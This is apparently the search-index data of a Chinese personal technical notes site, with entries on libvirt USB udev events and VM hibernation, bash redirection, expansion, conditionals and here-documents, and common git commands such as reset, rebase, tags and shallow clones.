<li>\u62d4\u6389\u4f1a\u51fa\u73b0 unbind, remove \u4e8b\u4ef6</li> <li>\u63d2\u5165\u4f1a\u51fa\u73b0 add, change, bind \u4e8b\u4ef6</li> </ul> </li> </ul> <pre><code>udevadm monitor --property --udev --subsystem-match=usb/usb_device\n</code></pre> <pre><code>UDEV  [262962.917716] unbind   /devices/pci0000:00/0000:00:01.2/0000:02:00.0/usb1/1-3 (usb)\nACTION=unbind\nDEVPATH=/devices/pci0000:00/0000:00:01.2/0000:02:00.0/usb1/1-3\nSUBSYSTEM=usb\nDEVNAME=/dev/bus/usb/001/009\nDEVTYPE=usb_device\nPRODUCT=1de1/f105/409\nTYPE=239/2/1\nBUSNUM=001\nDEVNUM=009\nSEQNUM=7429\nUSEC_INITIALIZED=261113847055\nID_PATH=pci-0000:02:00.0-usb-0:3\nID_PATH_TAG=pci-0000_02_00_0-usb-0_3\nMAJOR=189\nMINOR=8\n</code></pre> <pre><code>UDEV  [262890.680932] bind     /devices/pci0000:00/0000:00:08.1/0000:0a:00.3/usb3/3-3/3-3.4 (usb)\nACTION=bind\nDEVPATH=/devices/pci0000:00/0000:00:08.1/0000:0a:00.3/usb3/3-3/3-3.4\nSUBSYSTEM=usb\nDEVNAME=/dev/bus/usb/003/023\nDEVTYPE=usb_device\nDRIVER=usb\nPRODUCT=a12/1/8891\nTYPE=224/1/1\nBUSNUM=003\nDEVNUM=023\nSEQNUM=7414\nUSEC_INITIALIZED=262890673093\nID_VENDOR=0a12\nID_VENDOR_ENC=0a12\nID_VENDOR_ID=0a12\nID_MODEL=CSR8510_A10\nID_MODEL_ENC=CSR8510\\x20A10\nID_MODEL_ID=0001\nID_REVISION=8891\nID_SERIAL=0a12_CSR8510_A10\nID_BUS=usb\nID_USB_INTERFACES=:e00101:\nID_VENDOR_FROM_DATABASE=Cambridge Silicon Radio, Ltd\nID_MODEL_FROM_DATABASE=Bluetooth Dongle (HCI mode)\nID_PATH=pci-0000:0a:00.3-usb-0:3.4\nID_PATH_TAG=pci-0000_0a_00_3-usb-0_3_4\nMAJOR=189\nMINOR=278\n</code></pre>","tags":["KVM","libvirt","virsh","qemu"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/12/2022-11-12-libvirt/#\u4f11\u7720","title":"\u4f11\u7720","text":"<p>OVMF \u4e0d\u652f\u6301 S4(sleep to disk, hibernation) https://listman.redhat.com/archives/vfio-users/2017-September/msg00011.html</p> <pre><code>PS C:\\Windows\\system32&gt;  powercfg /A\n\u6b64\u7cfb\u7edf\u4e0a\u6ca1\u6709\u4ee5\u4e0b\u7761\u7720\u72b6\u6001:\n    \u5f85\u673a (S1)\n        \u7cfb\u7edf\u56fa\u4ef6\u4e0d\u652f\u6301\u6b64\u5f85\u673a\u72b6\u6001\u3002\n        \u865a\u62df\u673a\u76d1\u63a7\u7a0b\u5e8f\u4e0d\u652f\u6301\u6b64\u5f85\u673a\u72b6\u6001\u3002\n\n    \u5f85\u673a (S2)\n        \u7cfb\u7edf\u56fa\u4ef6\u4e0d\u652f\u6301\u6b64\u5f85\u673a\u72b6\u6001\u3002\n        \u865a\u62df\u673a\u76d1\u63a7\u7a0b\u5e8f\u4e0d\u652f\u6301\u6b64\u5f85\u673a\u72b6\u6001\u3002\n\n    \u5f85\u673a (S3)\n        \u865a\u62df\u673a\u76d1\u63a7\u7a0b\u5e8f\u4e0d\u652f\u6301\u6b64\u5f85\u673a\u72b6\u6001\u3002\n\n    \u4f11\u7720\n        \u8be5\u865a\u62df\u673a\u76d1\u63a7\u7a0b\u5e8f\u4e0d\u652f\u6301\u4f11\u7720\u3002\n\n    \u5f85\u673a(S0 \u4f4e\u7535\u91cf\u5f85\u673a)\n        \u7cfb\u7edf\u56fa\u4ef6\u4e0d\u652f\u6301\u6b64\u5f85\u673a\u72b6\u6001\u3002\n\n    \u6df7\u5408\u7761\u7720\n        \u5f85\u673a(S3)\u4e0d\u53ef\u7528\u3002\n        \u4f11\u7720\u4e0d\u53ef\u7528\u3002\n        \u865a\u62df\u673a\u76d1\u63a7\u7a0b\u5e8f\u4e0d\u652f\u6301\u6b64\u5f85\u673a\u72b6\u6001\u3002\n\n    \u5feb\u901f\u542f\u52a8\n        \u4f11\u7720\u4e0d\u53ef\u7528\u3002\n</code></pre> <p>https://www.linux-kvm.org/page/PowerManagement</p> <p>libvirt \u5f00\u542f\u4f11\u7720\u9009\u9879\uff1a</p> <pre><code>&lt;pm&gt;\n  &lt;suspend-to-disk enabled='yes'/&gt;\n  &lt;suspend-to-mem enabled='yes'/&gt;\n&lt;/pm&gt;\n</code></pre> <p>These elements enable ('yes') or disable ('no') BIOS support for S3 (suspend-to-mem) and S4 (suspend-to-disk) ACPI sleep states. If nothing is specified, then the hypervisor will be left with its default value. Note: This setting cannot prevent the guest OS from performing a suspend as the guest OS itself can choose to circumvent the unavailability of the sleep states (e.g. S4 by turning off completely).</p> <p>\u279c  VM-Pool sudo virsh domtime win10-base error: argument unsupported: QEMU guest agent is not configured</p>","tags":["KVM","libvirt","virsh","qemu"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/20/2022-11-20-bash/","title":"bash","text":"<p>bash</p>","tags":["bash"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/20/2022-11-20-bash/#\u53c2\u8003","title":"\u53c2\u8003","text":"<p>Bash Reference Manual: https://www.gnu.org/savannah-checkouts/gnu/bash/manual/bash.html</p>","tags":["bash"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/20/2022-11-20-bash/#rediction","title":"rediction","text":"<p>Redirections (Bash Reference Manual) (gnu.org) \u6bcf\u4e2a\u7a0b\u5e8f\u6709\u4e00\u4e2a\u6253\u5f00\u6587\u4ef6\u8868\uff0c\u8bb0\u5f55\u6587\u4ef6\u63cf\u8ff0\u7b26 fd \u548c\u5bf9\u5e94\u7684\u6587\u4ef6 vnode</p> <ul> <li>0: stdinput</li> <li>1: stdout</li> <li>2: stderr</li> </ul> <p>\u91cd\u5b9a\u5411\u5c31\u662f\u4fee\u6539\u5176\u4e2d\u7684\u9879</p> <ul> <li>\u91cd\u5b9a\u5411\u5230\u6587\u4ef6\uff08\u65b0\u5efa\u6587\u4ef6\uff0c\u6216\u8005 truncte \u5df2\u6709\u6587\u4ef6\uff09</li> <li>duplicate\uff0c\u590d\u5236\u5df2\u6709\u7684\u9879</li> </ul> <pre><code>n&gt;file  # \u91cd\u5b9a\u5411\u8f93\u51fan\uff0cn\u9ed8\u8ba4\u4e3a1\nn&lt;file  # \u91cd\u5b9a\u5411\u8f93\u5165n\uff0cn\u9ed8\u8ba4\u4e3a0\n\n&amp;&gt;file  # \u91cd\u5b9a\u5411stdout\u548cstderr\n\nn&gt;&gt;file # \u91cd\u5b9a\u5411\u8f93\u51fan\uff0cappend\u5230\u6587\u4ef6\n&amp;&gt;&gt;file # \u91cd\u5b9a\u5411stdout\u548cstderr\uff0cappend\u5230\u6587\u4ef6\n\nn&gt;&amp;m    # \u590d\u5236\u6587\u4ef6\u63cf\u8ff0\u7b26\n</code></pre> <p>\u91cd\u5b9a\u5411\u987a\u5e8f\u5f88\u91cd\u8981</p> <ul> <li>\u7b2c\u4e00\u884c\u547d\u4ee4\uff0c\u5148\u5c06 stdout \u91cd\u5b9a\u5411\u4e3a\u6587\u4ef6\uff0c\u7136\u540e\u7528 stdout \u9879\u8986\u76d6 stderr \u9879\uff0c\u56e0\u6b64\u4e8c\u8005\u90fd\u6307\u5411\u6587\u4ef6</li> <li>stderr \u5148\u88ab\u91cd\u5b9a\u5411\u5230 stdout\uff0c\u7136\u540e\u628a stdout \u91cd\u5b9a\u5411\u5230\u6587\u4ef6\u3002\u56e0\u6b64 stderr \u8fd8\u662f\u4f1a\u8f93\u51fa\u5230\u5c4f\u5e55\u4e0a</li> </ul> <pre><code>ls &gt; dirlist 2&gt;&amp;1  # stdout\u548cstderr\u88ab\u91cd\u5b9a\u5411\u5230\u6587\u4ef6\nls 2&gt;&amp;1 &gt; dirlist  # stderr\u4ecd\u4f1a\u8f93\u51fa\u5728\u5c4f\u5e55\n\nls 2&gt;dirlist &gt;&amp;2   # \u662f\u5426\u53ef\u884c?   \u5b9e\u9a8c\u786e\u5b9e\u53ef\u884c\n</code></pre>","tags":["bash"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/20/2022-11-20-bash/#\u7279\u6b8a\u7684\u91cd\u5b9a\u5411\u6587\u4ef6\u7f51\u7edc","title":"\u7279\u6b8a\u7684\u91cd\u5b9a\u5411\u6587\u4ef6\uff1a\u7f51\u7edc","text":"<p>zsh \u4e0d\u652f\u6301</p> <p>bash - /dev/tcp not found - Unix &amp; Linux Stack Exchange</p> <pre><code>printf \"GET / HTTP/1.1\\n\\n\" &gt; /dev/tcp/74.125.225.19/80\n</code></pre> <p>Redirections (Bash Reference Manual) (gnu.org) <code>/dev/tcp/host/port</code> If\u00a0host\u00a0is a valid hostname or Internet address, and\u00a0port\u00a0is an integer port number or service name, Bash attempts to open the corresponding TCP socket. <code>/dev/udp/host/port</code> If\u00a0host\u00a0is a valid hostname or Internet address, and\u00a0port\u00a0is an integer port number or service name, Bash attempts to open the corresponding UDP socket.</p>","tags":["bash"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/20/2022-11-20-bash/#\u5176\u5b83","title":"\u5176\u5b83","text":"<p>here-document</p> <pre><code>[n]&lt;&lt;[-]word\n        here-document\ndelimiter\n</code></pre> <p>here-string</p> <pre><code>[n]&lt;&lt;&lt; word\n</code></pre> <p>Moving File Descriptors</p> <pre><code>[n]&lt;&amp;digit-\n[n]&gt;&amp;digit-  # \u91cd\u5b9a\u5411\u540e\uff0c\u5173\u95eddigit\n</code></pre> <p>Opening File Descriptors for Reading and Writing</p> <p>causes the file whose name is the expansion of\u00a0word\u00a0to be opened for both reading and writing on file descriptor\u00a0n</p> <pre><code>[n]&lt;&gt;word\n</code></pre>","tags":["bash"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/20/2022-11-20-bash/#expansion\u6269\u5c55","title":"expansion(\u6269\u5c55)","text":"<p>\u6269\u5c55 = \u66ff\u6362 = \u5c55\u5f00</p> <p>\u6269\u5c55\u5373\u5c06\u4e00\u4e2a\u53d8\u91cf\u5c55\u5f00\uff0c\u5f97\u5230\u5b9e\u9645\u7684\u503c\u3002\u7528\u4e8e\u53d8\u91cf\u5b9a\u4e49\u3001\u547d\u4ee4\u66ff\u6362\u7b49\u5730\u65b9\u3002</p>","tags":["bash"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/20/2022-11-20-bash/#\u53d8\u91cf\u6269\u5c55","title":"\u53d8\u91cf\u6269\u5c55","text":"<p>bash \u624b\u518c\u4e2d\u5c06\u53d8\u91cf\u79f0\u4e3a shell parameter</p> <ul> <li>\u672a\u5b9a\u4e49\u65f6\u66ff\u6362 </li> </ul> <ul> <li>\u5b9a\u4e49\u65f6\u66ff\u6362  \u7528\u9014</li> </ul> <pre><code>PATH=\"${PATH:+${PATH}:}/staff/fyyuan/.fzf/bin\"\n</code></pre> <ul> <li>\u5b50\u5b57\u7b26\u4e32\u66ff\u6362</li> </ul> <p><code>${parameter: offset}</code> <code>${parameter: offset: length}</code></p> <p>This is referred to as Substring Expansion. It expands to up to\u00a0length\u00a0characters of the value of\u00a0parameter\u00a0starting at the character specified by\u00a0offset.</p> <pre><code>$ string=01234567890abcdefgh\n$ echo ${string:7}\n7890abcdefgh\n$ echo ${string:7:0}\n\n$ echo ${string:7:2}\n78\n$ echo ${string:7:-2}\n7890abcdef\n$ echo ${string: -7}\nbcdefgh\n$ echo ${string: -7:0}\n\n$ echo ${string: -7:2}\nbc\n$ echo ${string: -7:-2}\nbcdef\n</code></pre>","tags":["bash"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/20/2022-11-20-bash/#\u547d\u4ee4\u66ff\u6362-\u6269\u5c55","title":"\u547d\u4ee4\u66ff\u6362 (\u6269\u5c55)","text":"<p>\u4e24\u79cd\u683c\u5f0f</p> <pre><code>VAR=$(cat file1.txt nofile.txt 2&gt;&amp;1)\necho $VAR\n\n`command`\n</code></pre> <p>\u547d\u4ee4\u66ff\u6362\u5c31\u662f\u5c06\u4e00\u4e2a\u547d\u4ee4\u7684\u7ed3\u679c\uff08\u8f93\u51fa\uff0c\u9ed8\u8ba4\u4e3a stdout\uff09\u66ff\u6362\u5230\u5f53\u524d\u4f4d\u7f6e\uff0c\u6bd4\u5982\u7ed9\u53d8\u91cf\u8d4b\u503c\uff0c\u6216\u8005\u5d4c\u5165\u5b57\u7b26\u4e32\u4e2d\u3002</p> <p>Bash performs the expansion by executing\u00a0command\u00a0in a subshell environment and replacing the command substitution with the standard output of the command, with any trailing newlines deleted.</p>","tags":["bash"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/20/2022-11-20-bash/#\u83b7\u5f97\u547d\u4ee4\u8f93\u51fa\u6362\u884c\u6d88\u5931\u95ee\u9898","title":"\u83b7\u5f97\u547d\u4ee4\u8f93\u51fa\uff0c\u6362\u884c\u6d88\u5931\u95ee\u9898","text":"<p>How to avoid bash command substitution to remove the newline character? - Stack Overflow</p> <p><code>echo $var</code>\u65f6\uff0c\u4e0d\u4f1a\u663e\u793a\u6362\u884c\u3002\u9700\u8981\u4f7f\u7528\u53cc\u5f15\u53f7<code>echo \"$var\"</code></p>","tags":["bash"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/20/2022-11-20-bash/#\u6761\u4ef6\u5224\u65ad","title":"\u6761\u4ef6\u5224\u65ad","text":"","tags":["bash"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/20/2022-11-20-bash/#\u547d\u4ee4","title":"<code>[]</code>\u547d\u4ee4","text":"<p><code>[ EXPRESSION ]</code> \u7b49\u4ef7\u4e8e<code>test EXPRESSION</code></p> <ul> <li><code>STRING1 = STRING2</code>: the strings are equal</li> <li><code>STRING1 != STRING2</code>: the strings are not equal</li> <li><code>INTEGER1 -eq INTEGER2</code>: INTEGER1 is equal to INTEGER2</li> <li><code>INTEGER1 -ge INTEGER2</code>: INTEGER1 is greater than or equal to INTEGER2</li> <li><code>-n STRING</code>: the length of STRING is nonzero</li> <li><code>-z STRING</code>: the length of STRING is zero</li> <li><code>-d FILE</code>: FILE exists and is a directory</li> <li><code>-e FILE</code>: FILE exists</li> <li><code>-f FILE</code>: FILE exists and is a regular file</li> <li><code>arg1\u00a0OP\u00a0arg2</code><ul> <li><code>OP</code>\u00a0is one of \u2018-eq\u2019, \u2018-ne\u2019, \u2018-lt\u2019, \u2018-le\u2019, \u2018-gt\u2019, or \u2018-ge\u2019. These arithmetic binary operators return true if\u00a0arg1\u00a0is equal to, not equal to, less than, less than or equal to, greater than, or greater than or equal to\u00a0arg2, respectively.\u00a0Arg1\u00a0and\u00a0arg2\u00a0may be positive or negative integers. When used with the\u00a0<code>[[</code>\u00a0command,\u00a0Arg1\u00a0and\u00a0Arg2\u00a0are evaluated as arithmetic expressions (see\u00a0Shell Arithmetic).</li> </ul> </li> </ul> <p>\u6761\u4ef6\u8868\u8fbe\u5f0f Bash Reference Manual (gnu.org)</p>","tags":["bash"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/20/2022-11-20-bash/#-vs--vs--vs-","title":"<code>[[</code> vs <code>[</code> vs <code>(</code> vs <code>((</code>","text":"<p>shell - What is the difference between the Bash operators <code>[[</code> vs <code>[</code> vs <code>(</code> vs <code>((</code>? - Unix &amp; Linux Stack Exchange</p> <ul> <li> <p><code>if [ condition ]</code></p> <p><code>[</code> is another name for the traditional <code>test</code> command. <code>[</code> / <code>test</code> is a standard POSIX utility. All POSIX shells have it builtin (though that's not required by POSIX\u00b2). The <code>test</code> command sets an exit code and the <code>if</code> statement acts accordingly. Typical tests are whether a file exists or one number is equal to another.</p> </li> </ul> <ul> <li> <p><code>if [[ condition ]]</code></p> <p>This is a new upgraded variation on <code>test</code>\u00b9 from ksh that bash, zsh, yash, busybox sh also s matchesupport. This <code>[[ ... ]]</code> construct also sets an exit code and the <code>if</code> statement acts accordingly. Among its extended features, it can test whether a string a wildcard pattern (not in busybox sh).</p> </li> </ul> <ul> <li> <p><code>if ((condition))</code></p> <p>Another ksh extension that bash and zsh also support. This performs arithmetic. As the result of the arithmetic, an exit code is set and the <code>if</code> statement acts accordingly. It returns an exit code of zero (true) if the result of the arithmetic calculation is nonzero. Like <code>[[...]]</code>, this form is not POSIX and therefore not portable.</p> </li> </ul> <ul> <li> <p><code>if (command)</code></p> <p>This runs command in a subshell. When command completes, it sets an exit code and the <code>if</code> statement acts accordingly.</p> <p>A typical reason for using a subshell like this is to limit side-effects of <code>command</code> if <code>command</code> required variable assignments or other changes to the shell's environment. Such changes do not remain after the subshell completes.</p> </li> </ul> <ul> <li> <p><code>if command</code></p> <p>command is executed and the <code>if</code> statement acts according to its exit code.</p> </li> </ul>","tags":["bash"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/20/2022-11-20-bash/#\u6b63\u5219\u5224\u65ad","title":"\u6b63\u5219\u5224\u65ad","text":"<p><code>[[ expression ]]</code>\u5185 expression \u53ef\u4ee5\u4f7f\u7528\u6b63\u5219\u5224\u65ad https://www.gnu.org/savannah-checkouts/gnu/bash/manual/bash.html#index-_005b_005b</p> <ul> <li><code>==</code>, <code>!=</code>\uff1a<ul> <li>A == B \u8868\u793a\u5b57\u7b26\u4e32 A \u5339\u914d B\u3002!=\u8868\u793a\u4e0d\u5339\u914d\u3002</li> <li>\u5339\u914d\u89c4\u5219\uff1aBash Reference Manual (gnu.org)</li> </ul> </li> <li><code>=~</code>\uff1ausing the POSIX <code>regcomp</code> and <code>regexec</code> interfaces usually described in regex(3)</li> <li>\u903b\u8f91\u8fde\u63a5<ul> <li>! expression</li> <li>expression1 &amp;&amp; expression2</li> <li>expression1 || expression2<ul> <li>&amp;&amp;\u548c||\u5747\u6709\u77ed\u8def\u64cd\u4f5c\uff08\u4e0d\u5fc5\u5224\u65ad\u5168\u90e8\u8868\u8fbe\u5f0f\uff09</li> </ul> </li> </ul> </li> </ul> <p>\u4f8b\u5b50\uff1a</p> <pre><code>pattern='[[:space:]]*(a)?b'\n[[ $line =~ $pattern ]]\n</code></pre> <pre><code>if [[ $digit =~ [0-9] ]]; then\n    echo \"$digit is a digit\"\nelse\n    echo \"oops\"\nfi\n</code></pre>","tags":["bash"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/20/2022-11-20-bash/#\u547d\u4ee4\u5e8f\u5217","title":"\u547d\u4ee4\u5e8f\u5217","text":"<p>\u547d\u4ee4\u8fde\u63a5\u7b26</p> <p>Bash Reference Manual (gnu.org)- list of command</p> <ul> <li><code>;</code>: \u547d\u4ee4\u987a\u5e8f\u6267\u884c</li> <li><code>&amp;&amp;</code>: \u53ea\u6709\u524d\u4e00\u6761\u6210\u529f\u8fd0\u884c\u624d\u8fd0\u884c\u7b2c\u4e8c\u6761</li> <li><code>||</code>: \u524d\u9762\u5931\u8d25\u624d\u8fd0\u884c\u540e\u4e00\u6761</li> <li><code>&amp;</code>: \u547d\u4ee4\u540e\u53f0\u8fd0\u884c\uff0c\u4e5f\u53eb\u5f02\u6b65\u547d\u4ee4\uff08asynchronous\u00a0commands\uff09The shell does not wait for the command to finish, and the return status is 0 (true)</li> </ul>","tags":["bash"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/20/2022-11-20-bash/#\u5176\u5b83_1","title":"\u5176\u5b83","text":"","tags":["bash"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/20/2022-11-20-bash/#here-documenteof","title":"here-document(&lt;&lt;EOF)","text":"<p>\u7528\u4e8e\u7ed9\u7a0b\u5e8f\u63d0\u4f9b\u591a\u884c\u6587\u672c\u8f93\u5165(text)\uff0cEOF \u8868\u793a\u5206\u9694\u7b26\uff0c\u53ef\u4ee5\u662f\u5176\u5b83\u5b57\u7b26\u4e32\u3002</p> <p>\u53ef\u7528\u4e8e\u907f\u514d\u4ea4\u4e92\u8f93\u5165\uff0c\u6bd4\u5982 passwd \u65f6\u4f1a\u4ea4\u4e92\u5f0f\u5730\u8f93\u5165\u5bc6\u7801\uff0c\u4f7f\u7528 here-document \u5c06\u8f93\u5165\u63d0\u524d\u51c6\u5907\u597d\u5373\u53ef\u3002</p> <pre><code>$ wc &lt;&lt; EOF\n&gt; one two three\n&gt; four five\n&gt; EOF\n 2  5 24\n</code></pre>","tags":["bash"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/20/2022-11-20-bash/#here-string","title":"here-string(&lt;&lt;&lt;)","text":"<p>\u5c06\u4e00\u4e2a\u63d0\u524d\u51c6\u5907\u597d\u7684\u5b57\u7b26\u4e32\u4f5c\u4e3a\u7a0b\u5e8f\u8f93\u5165\uff0c\u540c\u6837\u7528\u4e8e\u907f\u514d\u4ea4\u4e92\u3002</p> <pre><code>bc &lt;&lt;&lt; 5*4 #\u7b49\u4ef7\u4e8eecho '5*4' | bc\n</code></pre>","tags":["bash"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/20/2022-11-20-bash/#bash-\u4e2d\u8c03\u7528-python","title":"bash \u4e2d\u8c03\u7528 python","text":"<pre><code>set -x\nvar=\"/path/to/file.ext\"\noutput=$(python &lt;&lt;EOF\nvar=\"$var\"\nvar=var.split('/')[-1].split('.')[0]\nprint(var)\nEOF\n)\n\n#output=$(python -c 'var=\"'$var'\";var=var.split(\"/\")[-1].split(\".\")[0];print(var)')\necho $output\n</code></pre>","tags":["bash"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/28/2022-11-28-git/","title":"git","text":"<p>git</p>","tags":["git"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/28/2022-11-28-git/#\u9ad8\u7ea7","title":"\u9ad8\u7ea7","text":"<ul> <li>\u4ece\u4e00\u4e2a\u8282\u70b9\u4ea7\u751f\u591a\u4e2a\u5206\u652f\uff0c\u80fd\u5426 rebase \u65b0\u7684 cm \u5230\u8be5\u8282\u70b9\uff1f</li> </ul>","tags":["git"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/28/2022-11-28-git/#reset-\u540e\u6062\u590d-reflog","title":"reset \u540e\u6062\u590d reflog","text":"<pre><code>git reflog\n</code></pre>","tags":["git"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/28/2022-11-28-git/#reset---soft---mixed---hard","title":"reset --soft, --mixed, --hard","text":"<p>version control - What's the difference between git reset --mixed, --soft, and --hard? - Stack Overflow</p> <p>\u4fee\u6539\u7684\u4e0d\u540c\u9636\u6bb5\uff1a</p> <ul> <li>in working directory\uff1a</li> <li>index / stagged\uff1a\u901a\u8fc7 git add</li> <li>commited\uff1a\u8fdb\u5165\u7248\u672c\u63a7\u5236\uff0ccommited \u7684\u4fee\u6539\u603b\u80fd\u627e\u56de\u6765\u3002</li> </ul> <pre><code>- A - B - C (master)\n</code></pre> <p>--soft B\uff1a\u5c06 C \u7684\u4fee\u6539\u6062\u590d\u5230 index \u4e2d --mixed B\uff1a\u5c06 C \u7684\u4fee\u6539\u6062\u590d\u5230 working directory \u4e2d --hard B\uff1aindex \u88ab\u4fee\u6539\u4e3a B\uff0cworking directory \u6e05\u7a7a</p> <p>git co \u548c git reset --mixed \u6548\u679c\u7c7b\u4f3c\uff0c\u90fd\u80fd\u4fdd\u7559\u5f53\u524d working directory\uff0c\u540c\u65f6\u8fd8\u80fd\u4fdd\u7559 git log\u3002</p>","tags":["git"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/28/2022-11-28-git/#rebase","title":"rebase","text":"<p>Q: git X \u5206\u652f\u6709 A, B, C \u4e09\u4e2a\u63d0\u4ea4\uff0cY \u5206\u652f\u6709 A, B2 \u4e24\u4e2a\u63d0\u4ea4\uff0c\u5982\u4f55\u5c06 X \u5206\u652f rebase \u5230 B2\u3002\u5176\u4e2d B \u548c B2 \u5b58\u5728\u51b2\u7a81 A:</p> <p><pre><code>git rebase --onto Y B X\n</code></pre> - <code>Y</code> \u662f\u4f60\u8981\u5c06\u63d0\u4ea4\u79fb\u5230\u7684\u5206\u652f\uff08\u5373 <code>B2</code> \u4e4b\u540e\uff09\u3002 - <code>B</code> \u662f\u4f60\u60f3\u8981\u5ffd\u7565\u7684\u57fa\u63d0\u4ea4\uff08<code>B</code> \u4f1a\u88ab\u66ff\u6362\u4e3a <code>B2</code>\uff09\u3002 - <code>X</code> \u662f\u5f53\u524d\u5206\u652f\u3002</p> <pre><code> git rb --onto local/main ddcfc5d memory\nFirst, rewinding head to replay your work on top of it...\nApplying: rewrite PPT-GPU get_max_active_block\nApplying: run sim error print output to stderr\n</code></pre>","tags":["git"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/28/2022-11-28-git/#tag","title":"tag","text":"<pre><code>#\u663e\u793a\u6240\u6709tag\ngit tag\n#\u663e\u793a\u5177\u4f53tag\u4fe1\u606f\ngit show v1.2\n#\u6dfb\u52a0tag\ngit tag v1.2 9fceb02 -a\ngit tag v1.2 9fceb02 -a -m \"my tag\"\n#\u5220\u9664tag\ngit tag -d v1.2\n#\u63a8\u9001tag\u5230\u8fdc\u7a0b\ngit push origin --tags\n</code></pre>","tags":["git"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/28/2022-11-28-git/#\u5c0f\u6280\u5de7","title":"\u5c0f\u6280\u5de7","text":"","tags":["git"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/28/2022-11-28-git/#shallow-clone","title":"shallow clone","text":"<p>\u907f\u514d clone \u7684\u4ed3\u5e93\u592a\u5927\uff0c\u5c06 git commit \u8bb0\u5f55\u622a\u65ad\u3002</p> <pre><code>git clone --depth 1 git://gcc.gnu.org/git/gcc.git\n</code></pre> <p><code>man git-clone</code> Create a shallow clone with a history truncated to the specified number of commits. Implies <code>--single-branch</code> unless <code>--no-single-branch</code> is given to fetch the histories near the tips of all branches. If you want to clone submodules shallowly, also pass <code>shallow-submodules</code>.</p>","tags":["git"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/28/2022-11-28-git/#\u4ee3\u7801\u7edf\u8ba1","title":"\u4ee3\u7801\u7edf\u8ba1","text":"<p>Git\u7edf\u8ba1\u4ee3\u7801\u91cf\u548c\u5e38\u7528\u547d\u4ee4 - lovezj9012 - \u535a\u5ba2\u56ed \u7edf\u8ba1\u6bcf\u4e2a\u4eba\u7684\u589e\u5220\u884c\u6570 <pre><code>git log --format='%aN' | sort -u | while read name; do echo -en \"$name\\t\"; git log --author=\"$name\" --pretty=tformat: --numstat | awk '{ add += $1; subs += $2; loc += $1 - $2 } END { printf \"added lines: %s, removed lines: %s, total lines: %s \", add, subs, loc }' -; done\n</code></pre></p> <p>\u6839\u636e\u65f6\u95f4\u6bb5\u6392\u9664\u6587\u4ef6\u5939\u7edf\u8ba1</p> <p>git log --since=2021-01-28 --until=2021-02-03 --pretty=tformat: --numstat -- . \":(exclude)src/test\" | awk '{ add += $1; subs += $2; loc += $1 + $2 } END { printf \"added lines: %s, removed lines: %s, total lines: %s\\n\", add, subs, loc }'</p> <p>-- . \":(exclude)folderName\"\u00a0 folderName\u6307src/test\u6587\u4ef6\u5939\uff0c\u8fd9\u91cc\u662f\u76f8\u5bf9\u8def\u5f84 -- . \":(exclude)folderName1\"\u00a0 \":(exclude)folderName2\"\u00a0 \u6392\u9664\u591a\u4e2a\u6587\u4ef6\u5939 -- . \":(exclude)folderName\"\u4e5f \u53ef\u4ee5\u7528\u5728\u5176\u4ed6\u7684\u7edf\u8ba1\u4e2d\uff1b--\u524d\u53ea\u80fd\u6709\u4e00\u4e2a\u7a7a\u683c\uff0c\u6709\u591a\u4e2a\u7a7a\u683c\u8bc6\u522b\u4e0d\u4e86</p>","tags":["git"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/28/2022-11-28-git/#\u4ee3\u7406","title":"\u4ee3\u7406","text":"","tags":["git"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/28/2022-11-28-git/#\u67e5\u770b\u8be6\u7ec6\u4fe1\u606f","title":"\u67e5\u770b\u8be6\u7ec6\u4fe1\u606f","text":"<ul> <li><code>GIT_TRACE=1</code></li> <li><code>git --verbose &lt;cmd&gt;</code></li> </ul>","tags":["git"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/28/2022-11-28-git/#http-\u548c-https-\u8bbe\u7f6e\u4ee3\u7406","title":"http \u548c https \u8bbe\u7f6e\u4ee3\u7406","text":"","tags":["git"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/28/2022-11-28-git/#ssh-\u4ee3\u7406","title":"ssh 